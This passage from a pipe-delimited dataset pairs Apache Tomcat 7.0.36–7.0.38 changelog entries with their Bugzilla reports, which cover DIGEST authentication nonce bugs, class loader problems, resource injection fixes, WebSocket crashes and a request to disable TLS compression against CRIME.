Name:Perm Gen [shared-rw]	Type:Non-heap memory	Initial:12582912	Committed:12582912	Maximum:12582912	Used:12582912


Instead in the gui page values are correct."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54638
Web applications|Tomcat 7.0.38 (markt)|fix||Correct typos in configuration samples on SSL Configuration page of Tomcat documentation. (kkolinko)|||
Web applications|Tomcat 7.0.38 (markt)|update||Disable support for comments on Changelog page of Tomcat documentation. (kkolinko)|||
Web applications|Tomcat 7.0.38 (markt)|fix||Fix several issues with status.xsd schema in Manager web application, testing it against actual output of StatusTransformer class. (kkolinko)|||
Web applications|Tomcat 7.0.38 (markt)|fix||Clarify the documentation on how context paths may be configured for web applications. (markt)|||
Other|Tomcat 7.0.38 (markt)|update|54601|Change catalina.sh to consistently use LOGGING_MANAGER variable to configure logging, instead of modifying JAVA_OPTS one. (kkolinko)|catalina.sh should not modify $JAVA_OPTS to add $LOGGING_MANAGER|"See https://issues.jenkins-ci.org/browse/JENKINS-7702 and http://issues.gradle.org/browse/GRADLE-1245 for background. Reproduced in 6.0.36 though reported also in Tomcat 7.

If you set an environment variable $JAVA_OPTS (say, ‚Äòexport JAVA_OPTS=-server‚Äô) before running startup.sh, the Catalina JVM will include an environment variable JAVA_OPTS set to e.g. ‚Äò-server -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager‚Äô. (This is not true if you do _not_ set JAVA_OPTS yourself: catalina.sh will modify a local shell variable but it does not export it.)

Normally this is harmless. But if the web application happens to fork an external process which happens to be one of the many Java applications that interpret $JAVA_OPTS when defined as JVM parameters, and that application uses java.util.logging at any point, then that application will generally crash because ClassLoaderLogManager is not in its classpath.

Indeed we did not really want to be passing -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager to the subprocess. If the user decided to specify some JAVA_OPTS for Tomcat, we should either pass this var unmodified to the JVM, or not pass it at all.

The fix seems simple enough (patch format upon request): in catalina.sh, replace

if [ -z ""$LOGGING_MANAGER"" ]; then
  JAVA_OPTS=""$JAVA_OPTS -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager""
else
  JAVA_OPTS=""$JAVA_OPTS $LOGGING_MANAGER""
fi

with

if [ -z ""$LOGGING_MANAGER"" ]; then
  LOGGING_MANAGER=-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
fi
CATALINA_JAVA_OPTS=""$JAVA_OPTS $LOGGING_MANAGER""

and then replace subsequent references to $JAVA_OPTS with $CATALINA_JAVA_OPTS. Optionally also

unset JAVA_OPTS

since any JVM options specified for the web server are likely to be inappropriate for other Java processes it spawns (though https://github.com/jenkinsci/gradle-plugin/pull/2 suggests otherwise).

The workaround in the web application is to sanitize the JAVA_OPTS environment variable before forking the subprocess, deleting the ClassLoaderLogManager configuration if found."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54601
Catalina|Tomcat 7.0.37 (markt)|fix|54521|Ensure that concurrent requests that require a DIGEST authentication challenge receive different nonce values. (markt)|DigestAuthenticator: nonceCountValid() fails in case of simultaneous asynchronous requests of the same client|"Concerned components:
org.apache.catalina.authenticator.DigestAuthenticator
org.apache.catalina.authenticator.DigestAuthenticator.NonceInfo

Scenario:
A multithreaded client sends two requests within one millisecond. The DigestAuthenticator creates for each request a nonce as well as a NonceInfo instance. The two nonces are equal, as they were created within the same millisecond. When writing data into the cache (method generateNonce()), the second NonceInfo instance overwrites the first one (same key!).

Problem:
The two client threads then send a second request with a digest authentication header. In both requests, ‚Äúnc‚Äù (nonce count) is equal ‚Äú1‚Äù, as the nonce has been newly created. In the NonceInfo of the first request, array ‚Äúseen‚Äù is set to ‚Äútrue‚Äù for index ((nonceCount + offset) % seen.length). In the second request the same NonceInfo instance is used, as the instance is retrieved from map ‚Äúnonces‚Äù using ‚Äúnonce‚Äù as a key, that is, in both requests the same key is used. Consequently, method ‚ÄúnonceCountValid()‚Äú returns ‚Äûfalse‚Äú, as  seen[(nonceCount + offset) % seen.length)] has already been set to ‚Äûtrue‚Äú.  Therefore the authentication fails, although the client has sent a valid digest authentication header.

Conclusion:
Working with multi-threaded clients with many requests, digest authentication does not function reliably."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54521
Catalina|Tomcat 7.0.37 (markt)|fix|54534|Ensure that, if a call to StandardWrapper#isSingleThreadModel() triggers the loading of a Servlet, the correct class loader is used. (markt)|JMX connection may load servlet with invalid ClassLoader|"Created attachment 29929 [details]
Project for reproduction of bug

I've recently observed a bug in Tomcat 7 that is causing our servers to fail to start-up, with the root cause being that, in response to a JMX request, Tomcat 7 is loading our servlet on a Thread whose contextClassLoader is NOT that of the web application.  This may lead to various problems; in our case, it leads to failure of Spring to find the requisite XSDs that are present in jars in our web app's WEB-INF/lib directory.

Here is the stack trace that is reported for Tomcat7.0.35 + Spring 3.1.1:

org.springframework.beans.factory.parsing.BeanDefinitionParsingException: Configuration problem: Unable to locate Spring NamespaceHandler for XML schema namespace [http://www.springframework.org/schema/context]
Offending resource: ServletContext resource [/WEB-INF/spring-servlet.xml]

	at org.springframework.beans.factory.parsing.FailFastProblemReporter.error(FailFastProblemReporter.java:68)
	at org.springframework.beans.factory.parsing.ReaderContext.error(ReaderContext.java:85)
	at org.springframework.beans.factory.parsing.ReaderContext.error(ReaderContext.java:80)
	at org.springframework.beans.factory.xml.BeanDefinitionParserDelegate.error(BeanDefinitionParserDelegate.java:316)
	at org.springframework.beans.factory.xml.BeanDefinitionParserDelegate.parseCustomElement(BeanDefinitionParserDelegate.java:1416)
	at org.springframework.beans.factory.xml.BeanDefinitionParserDelegate.parseCustomElement(BeanDefinitionParserDelegate.java:1409)
	at org.springframework.beans.factory.xml.DefaultBeanDefinitionDocumentReader.parseBeanDefinitions(DefaultBeanDefinitionDocumentReader.java:184)
	at org.springframework.beans.factory.xml.DefaultBeanDefinitionDocumentReader.doRegisterBeanDefinitions(DefaultBeanDefinitionDocumentReader.java:140)
	at org.springframework.beans.factory.xml.DefaultBeanDefinitionDocumentReader.registerBeanDefinitions(DefaultBeanDefinitionDocumentReader.java:111)
	at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.registerBeanDefinitions(XmlBeanDefinitionReader.java:493)
	at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.doLoadBeanDefinitions(XmlBeanDefinitionReader.java:390)
	at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:334)
	at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.loadBeanDefinitions(XmlBeanDefinitionReader.java:302)
	at org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:174)
	at org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:209)
	at org.springframework.beans.factory.support.AbstractBeanDefinitionReader.loadBeanDefinitions(AbstractBeanDefinitionReader.java:180)
	at org.springframework.web.context.support.XmlWebApplicationContext.loadBeanDefinitions(XmlWebApplicationContext.java:125)
	at org.springframework.web.context.support.XmlWebApplicationContext.loadBeanDefinitions(XmlWebApplicationContext.java:94)
	at org.springframework.context.support.AbstractRefreshableApplicationContext.refreshBeanFactory(AbstractRefreshableApplicationContext.java:131)
	at org.springframework.context.support.AbstractApplicationContext.obtainFreshBeanFactory(AbstractApplicationContext.java:522)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:436)
	at org.springframework.web.servlet.FrameworkServlet.configureAndRefreshWebApplicationContext(FrameworkServlet.java:631)
	at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:588)
	at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:645)
	at org.springframework.web.servlet.FrameworkServlet.initWebApplicationContext(FrameworkServlet.java:508)
	at org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:449)
	at org.springframework.web.servlet.HttpServletBean.init(HttpServletBean.java:133)
	at javax.servlet.GenericServlet.init(GenericServlet.java:160)
	at org.apache.catalina.core.StandardWrapper.initServlet(StandardWrapper.java:1274)
	at org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1186)
	at org.apache.catalina.core.StandardWrapper.allocate(StandardWrapper.java:858)
	at org.apache.catalina.core.StandardWrapper.isSingleThreadModel(StandardWrapper.java:592)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.tomcat.util.modeler.BaseModelMBean.getAttribute(BaseModelMBean.java:190)
	at org.apache.tomcat.util.modeler.BaseModelMBean.getAttributes(BaseModelMBean.java:234)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttributes(DefaultMBeanServerInterceptor.java:726)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.getAttributes(JmxMBeanServer.java:665)
	at javax.management.remote.rmi.RMIConnectionImpl.doOperation(RMIConnectionImpl.java:1408)
	at javax.management.remote.rmi.RMIConnectionImpl.access$200(RMIConnectionImpl.java:72)
	at javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation.run(RMIConnectionImpl.java:1265)
	at javax.management.remote.rmi.RMIConnectionImpl.doPrivilegedOperation(RMIConnectionImpl.java:1360)
	at javax.management.remote.rmi.RMIConnectionImpl.getAttributes(RMIConnectionImpl.java:636)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:303)
	at sun.rmi.transport.Transport$1.run(Transport.java:159)
	at java.security.AccessController.doPrivileged(Native Method)
	at sun.rmi.transport.Transport.serviceCall(Transport.java:155)
	at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:535)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:790)
	at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:649)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)

I've attached a simple Maven-based WAR project that can reproduce this -- see the README for exact steps.

In this case, the exception will occur, but after the artificially imposed 30 second delay completes, the servlet appears to load fine.  

In our actual systems, the servlet appears to remain in an incompletely loaded state.  My hypothesis is that this is timing-related... if StandardWrapper.allocate does not complete before the main thread that is loading the web application correctly, then I think the main thread adds a reference to the mis-loaded servlet, and the subsequent deallocate call in StandardWrapper.isSingleThreadModel does not unload the servlet, causing it to remain in its impaired state.

Please investigate this bug, since it is likely to affect users combining Tomcat + Spring WebMVC + JMX monitoring, which I believe to be a common use case."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54534
Catalina|Tomcat 7.0.37 (markt)|fix|54536|Ensure the default error page is displayed if a custom HTTP status code is used when calling HttpServletResponse#sendError(int, String). (markt)|ErrorReportValve doesn't respect HttpServletResponse.sendError(int sc, String msg)|"The changes of the ErrorSupportValve introduced in catalina-v7.0.30 does not respect HttpServletResponse.sendError(int sc, String msg)  because when a msg is provided with a status which is not present in the LocalStrings.properties of the 'org.apache.catalina.valves' package, the error page won't be forwarded to the response body.

This issue was triggered due to the following change which was performed at revision 1348777:

The change of the             
   report = sm.getString(""http."" + statusCode, message);
to
   report = sm.getString(""http."" + statusCode);

results in 'report==null' for custom status codes returning a response without the error page body.

        if (report == null) {
            return;
        }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54536
Coyote|Tomcat 7.0.37 (markt)|fix|54456|Ensure that if a client aborts a request when sending a chunked request body that this is communicated correctly to the client reading the request body. (markt)|ChunkedInputFilter returning EOF when client closes connection without sending end chunk|"Created attachment 29874 [details]
Patch to fix the bug

In my case client is processing user's InputStream and then sending data in chunks to server. At server end I read till EOF.
Client can be simple Java program or a web application. 

I am facing issue when client gets error on user's InputStream and closes connection with server. In that case ChunkedInputFilter is returning -1.
I have added logs and confirmed that endChunk is false.
Issue was fixed after I added following just before ""return result;""

if (result == -1 && !endChunk)
			throw new EOFException(""Unexpected end of stream while reading chunk body"");

I think ChunkedInputFilter should return -1 only when it gets endChunk.

Also, from client end I am always sending complete chunk. So, in ChunkedInputFilter I should get EOF from socket stream while reading next chunk header (which is handled properly in ChunkedInputFilter) but that is not happening.

I have attached patch. Patch was generated against tomcat/tc7.0.x/trunk"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54456
Coyote|Tomcat 7.0.37 (markt)|update||Update the native component of the APR/native connector to 1.1.27 and make that version the recommended minimum version. (markt)|||
Jasper|Tomcat 7.0.37 (markt)|add|54239|Enable web applications to provide their own Expression Language interpreter to enable them to optimise processing of expressions. Based on a patch by Sheldon Shao. (markt)|Extensible EL Interpreter|"Created attachment 29684 [details]
Interface of ELInterpreter

In some cases, applications need doing code generation for EL to make EL evaluation more faster.

It's better for tomcat to provide an extensible EL Interpreter. So application can inject it's own ELInterpreter to replace the default JspUtil.interpreterCall.

Attached an implementation."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54239
Web applications|Tomcat 7.0.37 (markt)|add|54505|Create clearer links from the JNDI How-To to the Tomcat specific options for configuring JNDI resources. (markt)|Resource 'closeMethod' is only documented under <Context> documentation|"cf. http://markmail.org/message/zvwyy5csr3bi4whj

The 'closeMethod' attribute is documented in the <Context> documentation, but in neither the ""JNDI Resources"" page of the users' guide nor the ""Resources"" page of the configuration guide. Thus, it's a little tough to find out about this configuration option."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54505
Other|Tomcat 7.0.37 (markt)|update||Update to Apache Commons Daemon 1.0.13. (markt)|||
Catalina|Tomcat 7.0.36 (markt)|fix||Make additional allowances for buggy client implementations of HTTP DIGEST authentication. This is a follow-on to 54060. (markt)|DigestAuthenticator doesn't parse Authorization header correctly|"From DigestAuthenticator at line 546

            // Bugzilla 37132: http://issues.apache.org/bugzilla/show_bug.cgi?id=37132
            String[] tokens = authorization.split("",(?=(?:[^\""]*\""[^\""]*\"")+$)"");

if the last term in the line is not enclosed in quotes, only a single 'term' results. For example:

Header: username=""mthornton"", qop=auth
token[0] is username=""mthornton"", qop=auth

Header: username=""mthornton"", qop=auth, cnonce=""9926cb3c334ede11""
token[0] is username=""mthornton""
token[1] is  qop=auth
token[2] is  cnonce=""9926cb3c334ede11""

(Headers abbreviated for clarity)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54060
Catalina|Tomcat 7.0.36 (markt)|fix|54438|Fix a regression in the fix for 52953 that triggered a NPE when digested passwords were used and an authentication attempt was made for a user that did not exist in the realm. (markt)|Bug fix 52953 introduces NullPointerException in RealmBase.java line 409 when user not found in JDBC|"The fix to bug 52953 introduces a NullPointerException at line 409
in RealBase.java

For example compare:
http://svn.apache.org/repos/asf/tomcat/tc7.0.x/tags/TOMCAT_7_0_26/java/org/apache/catalina/realm/RealmBase.java

and 
http://svn.apache.org/repos/asf/tomcat/tc7.0.x/tags/TOMCAT_7_0_27/java/org/apache/catalina/realm/RealmBase.java


String md5a1 = getDigest(username, realm);
was changed to
String md5a1 = getDigest(username, realm).toLowerCase(Locale.ENGLISH);

If getDigest(username,realm) returns null if the user is not found
and as a result you get a NPE when toLowerCase() is invoked on the null.

I looked in the trunk, and the code hasn't changed.

Seems like there should already be a bug posted on this as it makes digest
authentication useless, but I can't find one!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54438
Catalina|Tomcat 7.0.36 (markt)|fix|54448|Correctly handle @Resource annotations on primitives. Patch provided by Violeta Georgieva. (markt)|Field of primitive type, annotated with @Resource is not recognized as env entry|"Hi,

I have a servlet with one field of primitive type.
The field is annotated with @Resource.


public class MyServlet extends HttpServlet {

    @Resource(mappedName = ""1"")
    private int envEntry;

    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {
        ...
    }
}


When I request this servlet I receive the following exception:


SEVERE: Allocate exception for servlet MyServlet
javax.naming.NamingException: Cannot create resource instance
	at org.apache.naming.factory.ResourceEnvFactory.getObjectInstance(ResourceEnvFactory.java:117)
	at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:304)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:843)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:154)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:831)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:168)
	at org.apache.catalina.core.DefaultInstanceManager.lookupFieldResource(DefaultInstanceManager.java:581)
	at org.apache.catalina.core.DefaultInstanceManager.processAnnotations(DefaultInstanceManager.java:470)
	at org.apache.catalina.core.DefaultInstanceManager.newInstance(DefaultInstanceManager.java:157)
	at org.apache.catalina.core.DefaultInstanceManager.newInstance(DefaultInstanceManager.java:138)
	at org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1137)
	at org.apache.catalina.core.StandardWrapper.allocate(StandardWrapper.java:858)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:136)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1004)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:589)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:310)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)


That's because in the method below the primitive types are not 'converted' to their corresponding wrappers and this field is interpreted not as env entry but as resource env ref. org.apache.catalina.startup.WebAnnotationSet.addResource(Context, Resource, 
String, String)


I'm attaching a patch that solves this issue and a test case.

I'm looking forward to your comments.

Regards
Violeta"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54448
Catalina|Tomcat 7.0.36 (markt)|fix|54450|Correctly handle resource injection when part of the servlet properties uses @Resource and the other uses injection-target. Patch provided by Violeta Georgieva. (markt)|Injection fails when part of the servlet properties uses @Resource and the other uses 'injection-target'|"Hi,

I have a servlet with:
- annotated properties
- and injection-target declarations in web.xml

When I try to request this servlet I receive:


javax.naming.NameNotFoundException: Name [envEntry1] is not bound in this Context. Unable to find [envEntry1].
	at org.apache.naming.NamingContext.lookup(NamingContext.java:820)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:154)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:831)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:168)
	at org.apache.catalina.core.DefaultInstanceManager.lookupMethodResource(DefaultInstanceManager.java:622)
	at org.apache.catalina.core.DefaultInstanceManager.processAnnotations(DefaultInstanceManager.java:466)
	at org.apache.catalina.core.DefaultInstanceManager.newInstance(DefaultInstanceManager.java:157)
	at org.apache.catalina.core.DefaultInstanceManager.newInstance(DefaultInstanceManager.java:138)
	at org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1137)
	at org.apache.catalina.core.StandardWrapper.allocate(StandardWrapper.java:858)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:136)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1004)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:589)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:310)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)


The problem is that when the application uses 'injection-target' declarations in 

org.apache.catalina.core.DefaultInstanceManager.populateAnnotationsCache(Class<?>, Map<String, String>)

only the first setter method is evaluated and the rest are skipped.


I would like to propose a patch and test case.

I'm looking forward to your comments.

Regards
Violeta"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54450
Catalina|Tomcat 7.0.36 (markt)|fix|54458|Include exception when logging errors in the DataSourceRealm. Patch provided by Violeta Georgieva. (markt)|DataSourceRealm should provide more info on SQLException|"The getPassword() method of the DataSourceRealm does not log enough information when it encounters an SQL error.  The catch block is:

        } catch(SQLException e) {
            containerLog.error(
                    sm.getString(""dataSourceRealm.getPassword.exception"",
                                 username));
        } finally {

it would be really helpful to have some details of what the SQLException is.  I am getting this intermittently, and have resorted to subclassing getPassword() in an attempt to figure out what is going wrong."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54458
Catalina|Tomcat 7.0.36 (markt)|fix|54483|Correct one of the Spanish translations. Based on a suggestion from adinamita. (markt)|error in translation|"in the file LocalStrings_es.properties under org/apache/catalina/core, the property standardContext.reloadingCompleted has the value ""Se ha completado la Regarga de este Contexto"". 
It should be ""Se ha completado la recarga de este contexto"".

regarga != recarga


greetings."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54483
Catalina|Tomcat 7.0.36 (markt)|fix||"Prevent the SSO deregister when web application is stopped or reloaded. When StandardManager(pathname="""") or DeltaManager stops normally, all sessions in the context are expired. In this case, because most sessions is not time-out, SSO deregister was triggered. (kfujino)"|||
Catalina|Tomcat 7.0.36 (markt)|fix||Include the exception in the log message if the parsing of the context.xml file fails. (markt/kkolinko)|||
Catalina|Tomcat 7.0.36 (markt)|fix|54497|Make memory leak detection code more robust so a failure in the leak detection code does not prevent the Context from stopping unless the error is fatal to the JVM. (markt)|RuntimeException in WebappClassLoader.checkThreadLocalMapForLeaks() causes LifecycleException|"Observed this when testing Tomcat trunk at r1438747, at WinXP 32-bit, JDK 7u11.
(running TestWsWebSocketContainer with APR, Tomcat-Native 1.1.26 RC)

There occurred an NPE in WebappClassLoader.checkThreadLocalMapForLeaks(). It was uncaught and caused LifecycleException and ultimately a failure to stop Tomcat.

===============
In stderr:
SEVERE: A child container failed during stop
java.util.concurrent.ExecutionException: org.apache.catalina.LifecycleException: Failed to stop component [StandardEngine[Tomcat].StandardHost[localhost].StandardContext[]]
	at java.util.concurrent.FutureTask$Sync.innerGet(FutureTask.java:252)
	at java.util.concurrent.FutureTask.get(FutureTask.java:111)
	at org.apache.catalina.core.ContainerBase.stopInternal(ContainerBase.java:974)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232)
	at org.apache.catalina.core.ContainerBase$StopChild.call(ContainerBase.java:1404)
	at org.apache.catalina.core.ContainerBase$StopChild.call(ContainerBase.java:1393)
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
	at java.util.concurrent.FutureTask.run(FutureTask.java:166)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
	at java.lang.Thread.run(Thread.java:722)
Caused by: org.apache.catalina.LifecycleException: Failed to stop component [StandardEngine[Tomcat].StandardHost[localhost].StandardContext[]]
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:236)
	... 7 more
Caused by: org.apache.catalina.LifecycleException: Failed to stop component [WebappLoader[]]
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:236)
	at org.apache.catalina.core.StandardContext.stopInternal(StandardContext.java:5365)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232)
	... 7 more
Caused by: java.lang.NullPointerException
	at sun.reflect.UnsafeFieldAccessorImpl.ensureObj(UnsafeFieldAccessorImpl.java:54)
	at sun.reflect.UnsafeObjectFieldAccessorImpl.get(UnsafeObjectFieldAccessorImpl.java:36)
	at java.lang.reflect.Field.get(Field.java:372)
	at org.apache.catalina.loader.WebappClassLoader.checkThreadLocalMapForLeaks(WebappClassLoader.java:2247)
	at org.apache.catalina.loader.WebappClassLoader.checkThreadLocalsForLeaks(WebappClassLoader.java:2188)
	at org.apache.catalina.loader.WebappClassLoader.clearReferences(WebappClassLoader.java:1731)
	at org.apache.catalina.loader.WebappClassLoader.stop(WebappClassLoader.java:1641)
	at org.apache.catalina.loader.WebappLoader.stopInternal(WebappLoader.java:491)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232)
	... 9 more
===============
In testcase:
Testcase: testSmallTextBufferClientTextMessage took 2,328 sec
	Caused an ERROR
Failed to stop component [StandardServer[-1]]
org.apache.catalina.LifecycleException: Failed to stop component [StandardServer[-1]]
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:236)
	at org.apache.catalina.startup.Tomcat.stop(Tomcat.java:336)
	at org.apache.catalina.startup.TomcatBaseTest.tearDown(TomcatBaseTest.java:163)
Caused by: org.apache.catalina.LifecycleException: Failed to stop component [StandardService[Tomcat]]
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:236)
	at org.apache.catalina.core.StandardServer.stopInternal(StandardServer.java:766)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232)
Caused by: org.apache.catalina.LifecycleException: Failed to stop component [StandardEngine[Tomcat]]
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:236)
	at org.apache.catalina.core.StandardService.stopInternal(StandardService.java:501)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232)
Caused by: org.apache.catalina.LifecycleException: A child container failed during stop
	at org.apache.catalina.core.ContainerBase.stopInternal(ContainerBase.java:981)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232)
===============

Thoughts:
1. We should catch throwables in those checkFor**Leaks methods. It should not cause a ""failed to stop component"" failure.
2. In that method there are many calls to ""table[j]"". The array member should be evaluated only once, so that it does not become null unexpectedly."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54497
Catalina|Tomcat 7.0.36 (markt)|fix|54507|Do not start the background thread that is used for expiring sessions (amongst other things) until the web application is fully started. Stop the background thread as soon as the web application is stopped. (markt)|Notification for expired session sent to still initializing servlet context|"The Tomcat backgroundprocess for expiring sessions does not wait for the servlet context (application loaded by a filter) to be fully initialized. The following stacktrace happens while Filter.init is still being executed (hence the application is only partly initialized and shouldn't receive any work):

        at org.apache.wicket.protocol.http.WebApplication.sessionUnbound(WebApplication.java:552)
        at org.apache.wicket.session.HttpSessionStore$SessionBindingListener.valueUnbound(HttpSessionStore.java:465)
        at org.apache.catalina.session.StandardSession.removeAttributeInternal(StandardSession.java:1800)
        at org.apache.catalina.session.StandardSession.expire(StandardSession.java:865)
        at org.apache.catalina.session.StandardSession.isValid(StandardSession.java:658)
        at org.apache.catalina.session.ManagerBase.processExpires(ManagerBase.java:534)
        at org.apache.catalina.session.ManagerBase.backgroundProcess(ManagerBase.java:519)
        at org.apache.catalina.core.ContainerBase.backgroundProcess(ContainerBase.java:1352)
        at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1530)
        at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1540)
        at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1540)
        at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.run(ContainerBase.java:1519)
        at java.lang.Thread.run(Thread.java:722)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54507
Catalina|Tomcat 7.0.36 (markt)|fix||Allow WebSocket Ping/Pong messages to be sent between fragments of a fragmented message. (markt)|||
Catalina|Tomcat 7.0.36 (markt)|fix|54612|Check if the socket is closed before trying to write a WebSocket message to it. Also, flush any partial buffered data before closing the socket. (markt)|Fatal Error when trying to send data to WebSocket with conection closed|"Created attachment 29997 [details]
Crash report by Java VM

Occures: When try to send data to WebSocet using  org.apache.catalina.websocket.WsOutbound but socket is closed and onClose method has not managed to work out and remove connection from the collection.
Expected behavior: throw IOException;
Actual behavior: Fatal Error EXCEPTION_ACCESS_VIOLATION

Java: JDK-7.15
Tomcat: 7.0.37
Actual DLL version 1.1.27 (not 24)

Note. This works well on Linux but crash Tomcat on Windows"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54612
Coyote|Tomcat 7.0.36 (markt)|fix|54324|Allow APR connector to disable TLS compression if OpenSSL supports it. (schultz)|Support is required to disable TLS compression to prevent against CRIME attacks|"Support is required to disable TLS compression to prevent against CRIME attacks. 

Please see: https://community.qualys.com/blogs/securitylabs/2012/09/14/crime-information-leakage-attack-against-ssltls

